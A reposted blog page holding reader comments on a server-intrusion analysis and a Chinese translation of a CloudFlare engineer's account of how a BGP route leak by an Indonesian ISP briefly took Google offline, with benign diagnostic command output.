<a href="http://www.freebuf.com/articles/system/?replytocom=15575#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 虽然没看懂。但是感觉很高端的样子
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15576#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@litdg  <img src="http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg" alt="">
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15578#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xt9 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 baidu又搞防外链…
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15580#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
<a href="">亮了</a>(6)
<a href="http://www.freebuf.com/articles/system/?replytocom=15590#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> Helen <a href=""></a> 2013-09-11    4楼</li>
</ul>
<p>我国外的小弟做的
<a href="">亮了</a>(7)
<a href="http://www.freebuf.com/articles/system/?replytocom=15577#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=524" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/softbug" target="_blank">softbug </a> (4级) 用软件解放大家的双手，希望大家都可以使用自己开发的软件。 <a href=""></a> 2013-09-11    5楼</li>
</ul>
<p>好久没看到过入侵分析的文章了。而且是真实案例
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15581#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11    6楼</li>
</ul>
<p>比较弱智的小骇客的行为，对比足迹也没做任何处理，说明是自动化完成的。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15586#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/articles/system/?replytocom=15587#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx
嗯，是自动化行为，所以隐藏的比较粗糙，刚去分析了下这个shv5的rootkit，这个rootkit本身做的也比较粗糙，是基于替换文件的方式来完成的，并且也没做端口隐藏，通过strace一览无余。。
推荐有兴趣的朋友可以去分析下adore-ng这个rootkit，这个rootkit做的比较精致，知其然知其所以然，可好好了解下设计原理，更容易从设计角度来分析。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15601#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  恩。我也是分析shv5的时候发现的这文章。感谢回复。希望可以多多交流。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15614#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11    7楼</li>
</ul>
<p>2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
<a href="">亮了</a>(18)
<a href="http://www.freebuf.com/articles/system/?replytocom=15588#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 我也来亮一个
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15593#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 暴龙哥 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 虽然是几年前的文章，但是的确是个好东西。
也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/articles/system/?replytocom=15597#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@暴龙哥 你懂我！！！感谢
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15602#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=2918" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Draycen" target="_blank">Draycen </a> (1级)  <a href=""></a> 2013-09-11    8楼</li>
</ul>
<p><img src="" alt=":cool:"> 路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15592#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> helen <a href=""></a> 2013-09-11    9楼</li>
</ul>
<p>Holiday cracking Monday, 09 April 2007
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15598#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4398" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/逝情" target="_blank">逝情 </a> (1级) 弱爆了，求带~ <a href=""></a> 2013-09-11    10楼</li>
</ul>
<p>似乎，很高端的样子。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15600#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1070" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/p0tt1" target="_blank">p0tt1 </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FB达人"> (4级) 论之语网络安全工程师，Sniffer组员，NTsafe站长 <a href=""></a> 2013-09-11    11楼</li>
</ul>
<p>其实老外也有批量抓鸡的~但是按照楼主描述的安全配置的强度 不像能被抓到的~
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15604#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxoo <a href=""></a> 2013-09-12    12楼</li>
</ul>
<p>jboss /tomcat 等都有蠕虫吧<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="code"><pre>[<span class="link_label">亮了</span>](<span class="link_url"></span>)(1)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15623#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4790</span>) [<span class="link_label">Leo-o </span>](<span class="link_url">http://www.freebuf.com/author/Leo-o</span>) (1级)  []() 2013-09-12    13楼

Mark , 涨姿势了。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15676#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4025</span>) [<span class="link_label">心在想念 </span>](<span class="link_url">http://www.freebuf.com/author/心在想念</span>) (1级) 道，可道，非常道！名，可名，非常名！ []() 2013-09-13    14楼

高端。。。。。。。。。。。。。。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15679#respond</span>)
昵称
(必须)您当前尚未登录。[<span class="link_label">登陆</span>](<span class="link_url">http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Ffreebuf.com%2Farticles%2Fsystem%2F12443.html "登陆"</span>)？注册

邮箱
必须(保密)

发表言论前，请滑动滚动条解锁
[<span class="link_label">表情</span>](<span class="link_url"></span>)[<span class="link_label">插代码</span>](<span class="link_url"></span>)[<span class="link_label">插图</span>](<span class="link_url"></span>)

[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mrgreen"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "razz"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "sad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "smile"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "oops"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "grin"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "eek"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "???"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cool"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "lol"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "twisted"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "roll"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "wink"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "idea"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "arrow"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "neutral"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cry"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "?"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "evil"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "shock"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "!"</span>)
正在提交, 请稍候...

/#

[取消]()   有人回复时邮件通知我

<span class="header">### **本文这些评论亮了![]()[捐助我们](http://www.freebuf.com/donate)****Hot Comments**</span>

[xxx]() @ 2013-09-11 13:12:28

2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (18) [xt9]() @ 2013-09-11 11:01:53

一个普通的web蠕虫+IRC木马 而已。 据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。 文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (10) [Helen]() @ 2013-09-11 11:17:36

我国外的小弟做的
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (7) [xt9]() @ 2013-09-11 11:26:42

@litdg  ![](http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg)
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [litdg]() @ 2013-09-11 13:36:34

@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [whitemonty]() @ 2013-09-11 10:33:01

欢迎收看黑客追踪第一季
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (5) [xxx]() @ 2013-09-11 13:09:31

@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (2) [暴龙哥]() @ 2013-09-11 14:43:13

@xxx 虽然是几年前的文章，但是的确是个好东西。 也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (1) [xxoo]() @ 2013-09-12 10:25:42

jboss /tomcat 等都有蠕虫吧
</pre></td></tr></table></figure></p>
<p><a href="">亮了</a> (1)</p>
<h3 id="-new-posts-"><strong>最新发布**</strong>New Posts**</h3>
<ul>
<li><a href="http://www.freebuf.com/tools/13103.html" title="知名安全扫描工具AWVS 9（破解版下载）" target="_blank">知名安全扫描工具AWVS 9（破解版下载）</a></li>
<li><a href="http://www.freebuf.com/news/13031.html" title="喜剧：巴西黑客欲攻击NSA，结果NASA躺枪" target="_blank">喜剧：巴西黑客欲攻击NSA，结果NASA躺枪</a></li>
<li><a href="http://www.freebuf.com/news/13094.html" title="FireEye：中国黑客攻击美国无人机制造商" target="_blank">FireEye：中国黑客攻击美国无人机制造商</a></li>
<li><a href="http://www.freebuf.com/news/13081.html" title="解放区？上海自贸区将不设防火长城" target="_blank">解放区？上海自贸区将不设防火长城</a></li>
<li><a href="http://www.freebuf.com/tools/13073.html" title="DNS隧道制造工具——iodine" target="_blank">DNS隧道制造工具——iodine</a></li>
<li><a href="http://www.freebuf.com/tools/13063.html" title="网站指纹识别工具——WhatWeb v0.4.7发布" target="_blank">网站指纹识别工具——WhatWeb v0.4.7发布</a></li>
<li><a href="http://www.freebuf.com/news/13047.html" title="每月偷窃$50000美金的19岁阿根廷黑客被捕" target="_blank">每月偷窃$50000美金的19岁阿根廷黑客被捕</a></li>
<li><a href="http://www.freebuf.com/news/13010.html" title="国外发现勒索软件借助NSA棱镜事件行骗" target="_blank">国外发现勒索软件借助NSA棱镜事件行骗</a></li>
<li><a href="http://www.freebuf.com/news/12989.html" title="世界最大的数据库泄露统计" target="_blank">世界最大的数据库泄露统计</a></li>
<li><a href="http://www.freebuf.com/video/12984.html" title="十字路口的守望者：17岁白帽黑客的成长之路（视频）" target="_blank">十字路口的守望者：17岁白帽黑客的成长之路（视频）</a>
<img src="" alt=""> 微信扫描上图订阅freebuf，每日精华文章推送。
All of the material and the informations available on freebuf. com is for informative purpose. freebuf.com declines all responsibilities from the damage that may be done of it, consequently it does not encourage who might use it for illegal purposes.</li>
</ul>
<h3 id="freebuf-com">FREEBUF.COM</h3>
<p><a href="http://www.freebuf.com/dis" target="_blank">免责声明</a> <a href="http://www.freebuf.com/friends" target="_blank">友情链接</a> <a href="http://www.freebuf.com/newsend" target="_blank">我要投稿</a>
<a href="http://www.freebuf.com/others/864.html" target="_blank">关于我们</a> <a href="http://www.freebuf.com/partner" target="_blank">合作伙伴</a> <a href="http://www.freebuf.com/contact" target="_blank">联系我们</a></p>
<p>Copyright @ 2012 WWW.FREEBUF.COM All Rights Reserved <a href="http://www.miibeian.gov.cn/" target="_blank">沪ICP备13033796号-1</a>
<a href=""></a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--一次服务器被入侵后的分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">从谷歌宕机事件认识互联网工作原理</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-csdn-net">从谷歌宕机事件认识互联网工作原理-CSDN.NET</h1>
<p>您还未登录！|<a href="https://passport.csdn.net/account/login" target="_blank">登录</a>|<a href="https://passport.csdn.net/account/register" target="_blank">注册</a>|<a href="https://passport.csdn.net/help/faq" target="_blank">帮助</a></p>
<ul>
<li><a href="http://www.csdn.net/" target="_blank">首页</a></li>
<li><a href="http://news.csdn.net/" target="_blank">业界</a></li>
<li><a href="http://mobile.csdn.net/" target="_blank">移动</a></li>
<li><a href="http://cloud.csdn.net/" target="_blank">云计算</a></li>
<li><a href="http://sd.csdn.net/" target="_blank">研发</a></li>
<li><a href="http://bbs.csdn.net/" target="_blank">论坛</a></li>
<li><a href="http://blog.csdn.net/" target="_blank">博客</a></li>
<li><a href="http://download.csdn.net/" target="_blank">下载</a></li>
<li><h2 id="-"><a href="">更多</a></h2>
</li>
</ul>
<p><a href="http://www.csdn.net/" title="CSDN内容中心"></a></p>
<ul>
<li><a href="http://news.csdn.net/" target="_blank">业界</a></li>
<li><a href="http://mobile.csdn.net/" target="_blank">移动开发</a></li>
<li><a href="http://cloud.csdn.net/" target="_blank">云计算</a></li>
<li><a href="http://sd.csdn.net/" target="_blank">软件研发</a></li>
<li><a href="http://special.csdn.net/newssubject/index.html" target="_blank">专题</a></li>
<li><p><a href="http://www.programmer.com.cn/" target="_blank">程序员杂志</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/%E4%BA%A7%E5%93%81" target="_blank">产品</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/%E5%88%9B%E4%B8%9A" target="_blank">创业</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%81%8C%E5%9C%BA" target="_blank">职场</a></li>
<li><a href="http://www.csdn.net/article/tag/%E4%BA%BA%E7%89%A9" target="_blank">人物</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%AE%BE%E8%AE%A1" target="_blank">设计</a></li>
<li><p><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%BA%90" target="_blank">开源</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/ios" target="_blank">iOS</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/android" target="_blank">Android</a></li>
<li><a href="http://www.csdn.net/article/tag/windowsphone" target="_blank">WindowsPhone</a></li>
<li><a href="http://www.csdn.net/article/tag/html5" target="_blank">HTML5</a></li>
<li><a href="http://www.csdn.net/article/tag/rim" target="_blank">RIM</a></li>
<li><a href="http://www.csdn.net/article/tag/top30" target="_blank">TOP30</a></li>
<li><a href="http://www.csdn.net/article/tag/cmdn" target="_blank">CMDN</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83" target="_blank">数据中心</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">服务器</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%AD%98%E5%82%A8" target="_blank">存储</a></li>
<li><a href="http://www.csdn.net/article/tag/%E8%99%9A%E6%8B%9F%E5%8C%96" target="_blank">虚拟化</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank">大数据</a></li>
<li><a href="http://www.csdn.net/article/tag/nosql" target="_blank">NoSQL</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0" target="_blank">开放平台</a></li>
<li><p><a href="http://www.csdn.net/article/tag/%E5%AE%89%E5%85%A8" target="_blank">安全</a></p>
</li>
<li><p><a href="http://www.csdn.net/article/tag/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80" target="_blank">编程语言</a></p>
</li>
<li><a href="http://www.csdn.net/article/tag/%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0" target="_blank">开放平台</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91" target="_blank">前端开发</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95" target="_blank">智能算法</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%9E%B6%E6%9E%84" target="_blank">架构</a></li>
<li><a href="http://www.csdn.net/article/tag/%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank">数据库</a></li>
<li><a href="http://www.csdn.net/article/tag/%E5%B5%8C%E5%85%A5%E5%BC%8F" target="_blank">嵌入式</a>
<a href="http://news.csdn.net/rss_sd.html" target="_blank">订阅软件研发RSS</a> <a href="http://www.csdn.net/" target="_blank">CSDN首页</a><em>&gt;</em> <a href="http://sd.csdn.net/" target="_blank">软件研发</a></li>
</ul>
<h1 id="-">从谷歌宕机事件认识互联网工作原理</h1>
<h3 id="-3-1205-it-2-">发表于3小时前| 1205次阅读| 来源外刊IT评论| 2 条评论| 作者佚名</h3>
<p><a href="http://www.csdn.net/article/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank">服务器</a><a href="http://www.csdn.net/article/tag/%E8%B0%B7%E6%AD%8C" target="_blank">谷歌</a><a href="http://www.csdn.net/article/tag/%E6%B3%84%E9%9C%B2" target="_blank">泄露</a><a href="http://www.csdn.net/article/tag/%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95" target="_blank">智能算法</a><a href="http://www.csdn.net/article/tag/%E4%BA%92%E8%81%94%E7%BD%91" target="_blank">互联网</a></p>
<p><strong>摘要：</strong>谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。
<strong>译者注：本文中提到CloudFlare是一家总部位于美国旧金山的内容分发网络(CDN)服务公司，由Project Honey Pot项目的三位前开发人员成立于2009年。2011年10月被华尔街日报评为最具创新精神的网络科技公司。</strong></p>
<p>今天，谷歌服务器经历了短暂的宕机事件，持续大概27分钟，对部分地区的互联网用户造成了影响。此次事件的原因深究起来需要进入互联网络那深邃的、黑暗的角落。我是CloudFlare公司的一名网络工程师，在帮助谷歌从此次宕机中恢复回来提供了一臂之力。下面就是事情发生的过程。</p>
<p>大约在太平洋标准时间2012年11月5号下午6：24分/时间标准时间2012年11月6号凌晨2：24分，CloudFlare的员工发现谷歌的服务中断了。我们使用谷歌的电子邮件等服务，所以，当它的服务不正常时，办公室的人会很快发现。我在网络技术小组工作，因此我立刻接上网络查看是什么情况——是局部区域问题还是全球问题。</p>
<p><strong>问题排查</strong></p>
<p>我很快就意识到，所有谷歌的服务我们都不能连接上——甚至包括连接 8.8.8.8，谷歌的公共DNS服务器——于是，我从追查DNS开始。</p>
<ol>
<li>dig +trace google.com </li>
</ol>
<p>下面是我在探测Google.com的域名服务器时得到的回复：</p>
<p>google.com. 172800 IN NS ns2.google.com.</p>
<p>google.com. 172800 IN NS ns1.google.com.</p>
<p>google.com. 172800 IN NS ns3.google.com.</p>
<p>google.com. 172800 IN NS ns4.google.com.</p>
<p>;; Received 164 bytes from 192.12.94.30/#53(e.gtld-servers.net) in 152 ms</p>
<p>;; connection timed out; no servers could be reached</p>
<p>无法探测到任何服务器的结果证明确实有什么地方出了问题。尤其是，这意味着从我们的办公室将连接不到任何的谷歌DNS服务器。</p>
<p>我开始网络层查找问题，看看是否是在这个通信层出了问题。
PING 216.239.32.10 (216.239.32.10): 56 data bytes</p>
<p>Request timeout for icmp_seq 0</p>
<p>92 bytes from 1-1-15.edge2-eqx-sin.moratelindo.co.id (202.43.176.217): Time to live exceeded</p>
<p>这里出现了奇怪的信息。通常，我们不应该在谷歌的路由信息中看到一个印度尼西亚的网络服务提供商(Moratel)的名字。我立即进入一个CloudFlare的路由器中查看发生了什么事。与此同时，Twitter上世界其它地方的报告显示了我们并不是唯一遇到问题的地方。</p>
<p><strong>互联网路由</strong></p>
<p>为了理解是出了什么问题，你需要知道一些互联网是如何工作的基础知识。整个互联网是由很多的网络组成，这些网络被称为是“自治系统(AS)”。每个网络都有一个唯一的数字来标志自己，被称为AS号。CloudFlare的AS号是13335，谷歌的AS号是15169。各个网络通过一种叫做边缘网关协议(BGP)的技术互相连接。边缘网关协议被称为是互联网的粘合剂——由它来声明哪个IP地址属于哪个网络，由它来建立从某个自治网络到另外一个自治网络的路由。一个互联网“路由”跟这个词的表意完全一样：由一个自治网络里的IP地址到另外一个自治网络里的另一个IP地址的路径。</p>
<p>边缘网关协议是基于一个相互信任的体制。各个网络基于信任的原则告诉其它网络哪个IP地址属于哪个网络。当你发送一个数据包，或发送一个穿越网络的请求，你的网络服务提供商会联系它的上游提供商或对等提供商，询问它们从你的网络服务提供商到网络目的地，哪条路线最近。</p>
<p>不幸的是，如果当一个网络发出声明说某个IP地址或某个网络在它的内部，而事实不是这样，如果它的上游网络或对等网络信任了它，那么，这个数据包最终将会迷路丢失。这里发生的就是这个问题。</p>
<p>我查看了边缘网关协议传递的谷歌IP的路由地址，路由指向了Moratel (23947)，一个印度尼西亚的网络服务提供商。我们的办公室在加利福尼亚，离谷歌的数据中心并不远，数据包绝不应该经过印度尼西亚。很有可能是，Moratel声明了一个错误的网络路由。</p>
<p>当时我看到的边缘网关协议发来的路由是：
p&gt;tom@edge01.sfo01&gt; show route 216.239.34.10</p>
<p>inet.0: 422168 destinations, 422168 routes (422154 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>216.239.34.0/24 /*[BGP/170] 00:15:47, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>我查看了其它路由，比如谷歌的公共DNS，它同样被劫持到了相同的(不正确的)路径：</p>
<p>inet.0: 422196 destinations, 422196 routes (422182 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>8.8.8.0/24 /*[BGP/170] 00:27:02, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>tom@edge01.sfo01&gt; show route 8.8.8.8</p>
<p><strong>路由泄漏</strong></p>
<p>像这样的问题在行业内被认为是起源于“路由泄漏”，不是正常的，而是“泄漏”出来的路由。这种事情并不是没有先例。谷歌之前曾遭受过类似的宕机事件，当时推测是巴基斯坦为了禁止YouTube上的一个视频，巴基斯坦国家ISP删除了YouTube网站的路由信息。不幸的是，他们的这种做法被传递到了外部，巴基斯坦电信公司的上游提供商——电讯盈科(PCCW)信任了巴基斯坦电信公司的做法，把这种路由方式传递到了整个互联网。这个事件导致了YouTube网站大约2个小时不能访问。</p>
<p><img src="&quot;胖手指 辛普森&quot;" alt="胖手指 辛普森"></p>
<p>今天发生的事情属于类似情况。在Moratel公司的某个人很可能是“胖手指”，输错了互联网路由。而电讯盈科，Moratel公司的上游提供商，信任了Moratel公司传递给他们的路由。很快，这错误的路由就传到了整个互联网。在边缘网关协议这种信任模式中，与其说这是恶意的行为，不如说这是误操作或失误。</p>
<p><strong>修复</strong></p>
<p>解决方案就是让Moratel公司停止声明错误的路由。作为一个网络工程师，尤其是像CloudFlare这样的大网络公司里工作的工程师，很大一部分工作就是和其它世界各地的网络工程师保持联络。当探明问题后，我联系到了Moratel公司的一位同事，告诉他发生了什么事。他大概在太平洋标准时间下午6：50分/世界标准时间凌晨2：50分修复了这个问题。3分钟后，路由恢复了正常，谷歌的服务重新可以工作了。</p>
<p>从网络传输图上观察，我估计全球整个互联网用户的3-5%收到了此次宕机事故的影响。重灾区是香港，因为那是电讯盈科的总部。如果你所处的地区在当时无法访问谷歌的服务，你现在应该知道是什么原因了。</p>
<p><strong>构建更好的互联网</strong></p>
<p>我说这些就是想让大家知道我们的互联网上如何在一个相互信任的机制下建立起来的。今天的事故说明，即使你是一个像谷歌这样的大公司，外部你无法掌控的因素也会影响到你的用户，让他们无法访问你，所以，一个网络技术小组是非常必要的，由他们来监控路由，管理你与世界的联系。CloudFlare公司每天的工作就是确保客户得到最佳的路由。我们照看互联网上的所有网站，确保他们的以最快传输速度提供服务。今天的事情只是我们工作内容的一个小片段。</p>
<p>译文出自：<a href="http://www.aqee.net/why-google-went-offline-today-and-a-bit-about-how-the-internet-works/" target="_blank">外刊IT评论</a></p>
<p>英文出自：<a href="http://blog.cloudflare.com/why-google-went-offline-today-and-a-bit-about" target="_blank">Cloudflare</a></p>
<p>[分享到</p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
<p><img src="" alt="">
<img src="" alt=""></p>
